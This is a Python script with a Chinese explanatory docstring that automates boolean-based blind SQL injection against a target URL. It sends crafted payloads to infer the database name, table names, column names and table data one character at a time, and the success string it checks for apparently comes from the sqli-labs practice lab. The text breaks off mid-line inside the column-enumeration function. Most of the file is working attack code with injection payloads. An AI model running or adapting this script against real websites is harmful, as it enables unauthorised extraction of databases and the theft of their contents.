"""
这段代码是一个用于进行盲注（Blind SQL Injection）攻击的脚本，主要目的是通过不断尝试获取数据库信息的方式，实现获取数据库名、表名、字段名以及字段数据的功能。以下是对代码的详细解释：

1. **全局变量：**
    - `DBName`: 存放数据库名。
    - `DBTables`: 存放数据库表的列表。
    - `DBColumns`: 存放数据库表字段的列表。
    - `DBData`: 存放数据字典，键为字段名，值为字段数据列表。
    - `flag`: 若页面返回真，则会出现 "You are in..........."

2. **设置请求会话：**
    - 通过 `requests` 库设置了重连次数以及将连接改为短连接，防止因为HTTP连接数过多导致的 Max retries exceeded with url。

3. **主要功能函数：**
    - `StartSqli(url)`: 主函数，用于开始进行盲注攻击。通过调用其他函数，获取数据库名、表名、字段名、字段数据等信息。

    - `GetDBName(url)`: 获取数据库名的函数。通过盲注方式获取数据库名的长度和具体的数据库名。

    - `GetDBTables(url, dbname)`: 获取数据库表的函数。通过盲注方式获取数据库表的数量、表名的长度以及具体的表名。

    - `GetDBColumns(url, dbname, dbtable)`: 获取数据库表字段的函数。通过盲注方式获取数据库表字段的数量、字段名的长度以及具体的字段名。

    - `GetDBData(url, dbtable, dbcolumn)`: 获取表数据的函数。通过盲注方式获取字段数据的数量、数据长度以及具体的字段数据。

4. **辅助函数：**
    - `GetPayloadLength(url, payload)`: 用于获取长度的通用函数，通过盲注方式获取指定 payload 的长度。

    - `GetPayloadData(url, payload, data_len, position=None)`: 用于获取数据的通用函数，通过盲注方式获取指定 payload 的数据。

    - `GetSleepTime(url, payload)`: 通过盲注方式获取 sleep 时间，即在响应中判断注入语句是否成功执行。

5. **命令行参数解析：**
    - 使用 `optparse` 库解析命令行参数，主要接受用户输入的目标 URL。

6. **执行主程序：**
    - 如果脚本被作为独立程序执行，就会调用 `StartSqli` 函数，并传入用户输入的目标 URL。

"""

import requests
import optparse

# 存放数据库名变量
DBName = ""
# 存放数据库表变量
DBTables = []
# 存放数据库字段变量
DBColumns = []
# 存放数据字典变量,键为字段名，值为字段数据列表
DBData = {}
# 若页面返回真，则会出现You are in...........
flag = "You are in..........."

# 设置重连次数以及将连接改为短连接
# 防止因为HTTP连接数过多导致的 Max retries exceeded with url
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False


# 盲注主函数
def start_sqli(url):
    get_db_name(url)
    print("[+]当前数据库名:{0}".format(DBName))
    get_db_tables(url, DBName)
    print("[+]数据库{0}的表如下:".format(DBName))
    for item in range(len(DBTables)):
        print("(" + str(item + 1) + ")" + DBTables[item])
    table_index = int(input("[*]请输入要查看表的序号:")) - 1
    get_db_columns(url, DBName, DBTables[table_index])
    while True:
        print("[+]数据表{0}的字段如下:".format(DBTables[table_index]))
        for item in range(len(DBColumns)):
            print("(" + str(item + 1) + ")" + DBColumns[item])
        column_index = int(input("[*]请输入要查看字段的序号(输入0退出):")) - 1
        if column_index == -1:
            break
        else:
            get_db_data(url, DBTables[table_index], DBColumns[column_index])


# 获取数据库名函数
def get_db_name(url):
    # 引用全局变量DBName,用来存放网页当前使用的数据库名
    global DBName
    print("[-]开始获取数据库名长度")
    # 保存数据库名长度变量
    DBNameLen = 0
    # 用于检查数据库名长度的payload
    payload = "' and if(length(database())={0},1,0) %23"
    # 把URL和payload进行拼接得到最终的请求URL
    target_url = url + payload
    # 用for循环来遍历请求，得到数据库名长度
    for DBNameLen in range(1, 99):
        # 对payload中的参数进行赋值猜解
        res = conn.get(target_url.format(DBNameLen))
        # 判断flag是否在返回的页面中
        if flag in res.content.decode("utf-8"):
            print("[+]数据库名长度:" + str(DBNameLen))
            break
    print("[-]开始获取数据库名")
    payload = "' and if(ascii(substr(database(),{0},1))={1},1,0) %23"
    target_url = url + payload
    # a表示substr()函数的截取起始位置
    for a in range(1, DBNameLen + 1):
        # b表示33~127位ASCII中可显示字符
        for b in range(33, 128):
            res = conn.get(target_url.format(a, b))
            if flag in res.content.decode("utf-8"):
                DBName += chr(b)
                print("[-]" + DBName)
                break


# 获取数据库表函数
def get_db_tables(url, dbname):
    global DBTables
    # 存放数据库表数量的变量
    DBTableCount = 0
    print("[-]开始获取{0}数据库表数量:".format(dbname))
    # 获取数据库表数量的payload
    payload = "' and if((select count(*)table_name from information_schema.tables where table_schema='{0}')={1},1,0) %23"
    target_url = url + payload
    # 开始遍历获取数据库表的数量
    for DBTableCount in range(1, 99):
        res = conn.get(target_url.format(dbname, DBTableCount))
        if flag in res.content.decode("utf-8"):
            print("[+]{0}数据库的表数量为:{1}".format(dbname, DBTableCount))
            break
    print("[-]开始获取{0}数据库的表".format(dbname))
    # 遍历表名时临时存放表名长度变量
    table_len = 0
    # a表示当前正在获取表的索引
    for a in range(0, DBTableCount):
        print("[-]正在获取第{0}个表名".format(a + 1))
        # 先获取当前表名的长度
        for table_len in range(1, 99):
            payload = "' and if((select LENGTH(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},1,0) %23"
            target_url = url + payload
            res = conn.get(target_url.format(dbname, a, table_len))
            if flag in res.content.decode("utf-8"):
                break
        # 开始获取表名
        # 临时存放当前表名的变量
        table = ""
        # b表示当前表名猜解的位置
        for b in range(1, table_len + 1):
            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},1,0) %23"
            target_url = url + payload
            # c表示33~127位ASCII中可显示字符
            for c in range(33, 128):
                res = conn.get(target_url.format(dbname, a, b, c))
                if flag in res.content.decode("utf-8"):
                    table += chr(c)
                    print(table)
                    break
        # 把获取到的名加入到DBTables
        DBTables.append(table)
        # 清空table，用来继续获取下一个表名
        table = ""


# 获取数据库表的字段函数
def get_db_columns(url, dbname, dbtable):
    global DBColumns
    # 存放字段数量的变量
    DBColumnCount = 0
    print("[-]开始获取{0}数据表的字段数:".format(dbtable))
    for DBColumnCount in range(99):
        payload = "' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},1,0) %23"
        target_url = url + payload
        res = conn.get(target_url.format(dbname, dbtable, DBColumnCount))
        if flag in res.content.decode("utf-8"):
            print("[-]{0}数据表的字段数为:{1}".format(dbtable, DB
